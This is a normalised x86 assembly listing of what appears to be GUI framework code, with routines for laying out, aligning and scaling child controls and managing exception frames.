mov ebx eax
mov edx esi
mov eax ebx
call sub_44f2a8
mov eax esi
mov edx [ r-xdata ]
call sub_404800
mov [ ebx + 0x20 ] eax
pop esi
pop ebx
retn
sub_453534
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor eax eax
push ebp
push sub_45364e
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax ebx
call sub_44f6fc
push ebx
push sub_4552ec
call sub_421084
mov [ ebx + 0x1c0 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_424e10
mov esi eax
mov [ ebx + 0x1a4 ] esi
mov edx [ ebx + 0x70 ]
mov eax esi
call sub_424fb8
mov [ ebx + 0x1dd ] 0x1
mov [ ebx + 0x1d4 ] 0xffffffff
mov [ ebx + 0x1b8 ] 0x3
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x11
jne r-xdata
add esp 0xfffffff0
call sub_404974
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4441f8
mov edx [ ebp - 0x8 ]
lea eax [ ebx + 0x1bc ]
call sub_405584
lea eax [ ebx + 0x1bc ]
call sub_405530
jmp r-xdata
mov [ ebx + 0x1db ] 0x0
movzx eax [ r-xdata ]
mov [ ebx + 0x192 ] al
mov [ ebx + 0x193 ] 0x2
mov [ ebx + 0x194 ] 0x1
mov [ ebx + 0x198 ] 0x1
mov [ ebx + 0x158 ] 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45dcac
mov esi eax
mov [ ebx + 0x1a0 ] esi
mov [ esi + 0x1c ] ebx
mov [ esi + 0x18 ] sub_459984
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453655
lea eax [ ebp - 0x8 ]
call sub_405530
retn
sub_453655
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4049cc
pop [ fs : 0x0 ]
add esp 0xc
sub_453678
push ebx
push esi
push edi
push ebp
call sub_404a1c
mov ebx edx
mov ebp eax
mov eax ebp
call sub_420278
cmp [ ebp + 0x1dc ] 0x0
je r-xdata
lea eax [ ebp + 0x1b0 ]
call sub_40700c
mov eax [ ebp + 0x1ac ]
call sub_404650
cmp [ ebp + 0x30 ] 0x0
je r-xdata
mov [ ebp + 0x1dc ] 0x0
xor edx edx
mov eax ebp
call sub_44e1a0
cmp [ ebp + 0x1b4 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebp
call sub_454464
mov eax ebp
call sub_4546e8
mov esi eax
test esi esi
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx + 0xb4 ]
mov eax [ ebp + 0x1a4 ]
call sub_404650
mov eax [ ebp + 0x1c0 ]
test eax eax
je r-xdata
mov edx esi
dec edx
mov eax ebp
call sub_4546ac
mov edi eax
mov edx edi
mov eax ebp
call sub_4544d0
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov eax ebp
call sub_4546e8
mov esi eax
test esi esi
jne r-xdata
mov eax [ ebp + 0x1a0 ]
call sub_404650
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_44f7f4
test bl bl
jle r-xdata
call sub_42111c
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4049c4
sub_453758
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1d0 ] 0x0
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor ecx ecx
push ebp
push sub_45381c
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
call sub_419a38
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov ebx [ ebp - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
cmp edx [ ebp - 0x8 ]
jge r-xdata
inc esi
dec ebx
jne r-xdata
mov edx esi
call sub_458838
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1d0 ]
mov edx esi
call sub_419898
mov edx [ eax + 0x1d4 ]
test edx edx
jl r-xdata
mov ecx eax
mov eax [ ebp - 0xc ]
call sub_41998c
mov edx esi
mov eax [ ebp - 0xc ]
call sub_419898
test eax eax
je r-xdata
sub_45382c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_454204
xor eax eax
push ebp
push sub_45386c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44fb2c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453873
mov eax [ ebp - 0x4 ]
call sub_45420c
retn
sub_453873
mov eax [ ebp - 0x4 ]
call sub_453758
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_4551b8
pop ebx
pop ecx
pop ebp
retn
push 0x0
xor ecx ecx
mov edx 0xb011
mov eax [ ebp - 0x4 ]
call sub_451b4c
sub_4538a4
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0x8 ]
add [ edx ] ecx
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0xc ]
add [ edx + 0x4 ] ecx
mov ecx [ eax + 0x1a0 ]
mov ecx [ ecx + 0x10 ]
sub [ edx + 0x8 ] ecx
mov eax [ eax + 0x1a0 ]
mov eax [ eax + 0x14 ]
sub [ edx + 0xc ] eax
retn
sub_4538d4
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x24 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x175 ] 0x0
je r-xdata
movzx eax [ ebp + 0x14 ]
movzx eax [ eax + rw-data ]
cmp al [ esi + 0x61 ]
je r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x179 ] 0x0
je r-xdata
mov eax [ edi + 0x8 ]
sub eax [ edi ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0xc ] eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
test [ esi + 0x61 ] 0x4
je r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x10 ] eax
movzx eax [ ebp + 0x14 ]
add al 0xfd
sub al 0x2
jb r-xdata
test [ esi + 0x61 ] 0x1
jne r-xdata
test [ esi + 0x61 ] 0x1
je r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x14 ] eax
movzx eax [ ebp + 0x14 ]
dec eax
sub al 0x2
jb r-xdata
sub al 0x1
jne r-xdata
test [ esi + 0x61 ] 0x8
je r-xdata
mov eax [ esi + 0x175 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x165 ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x175 ]
sub edx [ esi + 0x165 ]
sub eax edx
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ ebx ]
mov edx [ esi + 0x175 ]
sub edx [ esi + 0x165 ]
sub eax edx
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x78 ]
call sub_45ddc4
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x10 ]
jne r-xdata
jmp [ eax * 4 + jump_table_453b37 ]
sub al 0x3
jne r-xdata
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
jl r-xdata
test [ esi + 0x61 ] 0x2
jne r-xdata
test [ esi + 0x61 ] 0x2
je r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
movzx eax [ ebp + 0x14 ]
cmp eax 0x5
ja r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp eax [ ebp - 0x14 ]
je r-xdata
mov eax [ ebp - 0x14 ]
add [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
sub [ edi + 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
add [ edi ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub [ edi + 0x8 ] eax
mov eax [ edi + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov eax [ esi + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x44 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push edi
lea eax [ ebp - 0x24 ]
push eax
lea ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xac ]
mov eax [ edi ]
mov [ ebp - 0x8 ] eax
mov eax [ edi + 0x4 ]
mov [ ebp - 0xc ] eax
movzx eax [ ebp + 0x14 ]
cmp eax 0x6
ja r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x179 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x169 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x179 ]
sub edx [ esi + 0x169 ]
sub eax edx
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebx + 0x4 ]
mov edx [ esi + 0x179 ]
sub edx [ esi + 0x169 ]
sub eax edx
mov [ ebp - 0x14 ] eax
jmp r-xdata
jmp [ eax * 4 + jump_table_453bff ]
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
push 0x1
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x78 ]
call sub_45ddc4
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
sub [ edi + 0x4 ] edx
jmp r-xdata
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
sub [ edi ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
jmp r-xdata
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x10 ]
sub edx eax
add [ edi + 0x8 ] edx
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov edx [ ebp - 0x14 ]
sub edx eax
add [ edi + 0xc ] edx
movzx eax [ r-xdata ]
and al [ esi + 0x61 ]
movzx edx [ r-xdata ]
cmp dl al
je r-xdata
mov eax [ esi + 0x175 ]
push eax
mov eax [ ebx ]
push eax
mov eax [ esi + 0x16d ]
push eax
call MulDiv
mov edx [ ebp - 0x10 ]
sar edx 0x1
jns r-xdata
mov eax [ esi + 0x179 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ esi + 0x171 ]
push eax
call MulDiv
mov edx [ ebp - 0x14 ]
sar edx 0x1
jns r-xdata
sub eax edx
mov [ ebp - 0x8 ] eax
adc edx 0x0
sub eax edx
mov [ ebp - 0xc ] eax
adc edx 0x0
sub_453cb4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_458904
test al al
je r-xdata
mov ecx esi
mov edx [ ebx + 0x4c ]
mov eax [ ebx + 0x48 ]
call sub_418420
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0x8 ]
add edx [ eax + 0x10 ]
sub [ esi ] edx
mov eax [ ebx + 0x1a0 ]
mov edx [ eax + 0xc ]
add edx [ eax + 0x14 ]
sub [ esi + 0x4 ] edx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453d14
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
movzx edx [ ebp - 0x5 ]
cmp edx 0x6
ja r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
jmp [ edx * 4 + jump_table_453d3a ]
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
mov edx 0x1
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x3
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x1
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x3
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
cmp ebx eax
setl al
jmp r-xdata
xor edx edx
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov ebx eax
mov edx 0x2
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
add ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x78 ]
mov edx 0x2
mov ecx [ eax ]
call [ ecx + 0x10 ]
add esi eax
cmp ebx esi
setge al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx esi
mov ebx [ eax ]
call [ ebx + 0xa8 ]
sub_453e44
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx edx
mov esi eax
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ esi + 0x30 ]
call sub_453cb4
lea ecx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4538d4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_453e8c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4546e8
dec eax
test eax eax
jl r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp bl [ eax + 0x5b ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
call sub_419740
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] bl
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp - 0x4 ]
call sub_419898
lea ecx [ ebp - 0x18 ]
mov edx ebx
call sub_453e44
pop ecx
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_4546ac
mov edi eax
cmp bl [ edi + 0x5b ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp edi [ eax - 0x10 ]
je r-xdata
test [ edi + 0x1c ] 0x10
jne r-xdata
mov eax [ r-xdata ]
and eax [ edi + 0x50 ]
mov edx [ r-xdata ]
cmp edx eax
je r-xdata
xor esi esi
jmp r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
cmp esi [ eax + 0x8 ]
jge r-xdata
test [ edi + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov ecx edi
mov edx esi
call sub_419914
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx esi
call sub_419898
mov edx eax
mov ecx ebx
mov eax edi
call sub_453d14
pop ecx
test al al
je r-xdata
inc esi
sub_454018
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov bl 0x1
mov eax [ edi ]
call sub_4546e8
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ edi ]
mov edx esi
call sub_4546ac
cmp [ eax + 0x5b ] 0x0
jne r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax [ edi ]
mov edx esi
call sub_4546ac
movzx edx [ r-xdata ]
cmp dl [ eax + 0x61 ]
jne r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
sub_45406c
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1dc ] 0x0
je r-xdata
push ebp
call sub_454018
pop ecx
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1db ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1da ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x90 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_45414b
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
mov al 0x1
call sub_453e8c
pop ecx
push ebp
mov al 0x2
call sub_453e8c
pop ecx
push ebp
mov al 0x3
call sub_453e8c
pop ecx
push ebp
mov al 0x4
call sub_453e8c
pop ecx
push ebp
mov al 0x5
call sub_453e8c
pop ecx
push ebp
mov al 0x6
call sub_453e8c
pop ecx
push ebp
xor eax eax
call sub_453e8c
pop ecx
mov eax [ ebp - 0x4 ]
mov si 0xffc6
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1b0 ] 0x0
je r-xdata
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffee
call sub_40484c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1b0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x2c ]
sub_454170
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_458904
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x190 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_454204
xor eax eax
push ebp
push sub_4541f7
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x94 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xffef
mov eax [ ebp - 0x4 ]
call sub_45420c
retn
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x10
jmp r-xdata
sub_454234
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4542f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_450210
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov eax [ ebp - 0xc ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454300
mov eax [ ebp - 0xc ]
call sub_404650
retn
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov edx eax
mov eax [ ebp - 0xc ]
call sub_419740
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_44ff24
push 0x0
mov edx esi
mov eax [ ebp - 0xc ]
call sub_419898
xor ecx ecx
mov edx 0xb03e
call sub_451b4c
inc esi
dec ebx
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov edi eax
mov eax [ edi + 0x4 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x4 ]
jne r-xdata
sub_454308
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4546e8
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_404620
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_454204
xor edx edx
push ebp
push sub_4543f6
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
call sub_4546e8
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffbf
call sub_40484c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
jmp r-xdata
inc edi
xor ebx ebx
mov eax [ ebp - 0xc ]
mov esi [ eax + 0x8 ]
test esi esi
jg r-xdata
inc ebx
dec edi
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4546ac
mov edx eax
mov eax [ ebp - 0xc ]
call sub_419740
mov edx esi
dec edx
mov eax [ ebp - 0xc ]
call sub_419898
mov ebx eax
cmp [ ebx + 0x5b ] 0x3
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_404650
mov eax [ ebp - 0x4 ]
call sub_45420c
retn
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4546ac
movzx eax [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
mov dl 0x3
mov eax ebx
call sub_44fc18
mov dl 0x4
mov eax ebx
call sub_44fc18
jmp r-xdata
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x8 ]
dec edx
mov eax [ ebp - 0xc ]
call sub_41978c
sub_454464
push ebx
push esi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax esi
call sub_43bd90
test eax eax
je r-xdata
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
call sub_440b90
sub_454484
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
lea eax [ esi + 0x1cc ]
mov edx ebx
call sub_44ee58
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_44ee58
lea eax [ esi + 0x1c8 ]
mov edx ebx
call sub_44ee58
jmp r-xdata
mov [ ebx + 0x30 ] esi
sub_4544d0
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4047dc
test al al
je r-xdata
lea eax [ esi + 0x1cc ]
mov edx ebx
call sub_44ee80
lea eax [ esi + 0x1c8 ]
mov edx ebx
call sub_44ee80
lea eax [ esi + 0x1d0 ]
mov edx ebx
call sub_44ee80
jmp r-xdata
xor eax eax
mov [ ebx + 0x30 ] eax
pop esi
pop ebx
retn
sub_454518
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_40484c
mov [ esp ] ebx
mov [ esp + 0x4 ] edi
push 0x1
lea ecx [ esp + 0x4 ]
mov edx 0xb04c
mov eax edi
call sub_451b4c
push 0x1
mov esi ebx
mov ecx esi
mov edx 0xb02c
mov eax edi
call sub_451b4c
mov edx ebx
mov eax edi
call sub_454484
test [ ebx + 0x1c ] 0x2
jne r-xdata
push 0x1
mov ecx esi
mov edx 0xb036
mov eax edi
call sub_451b4c
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
push 0x0
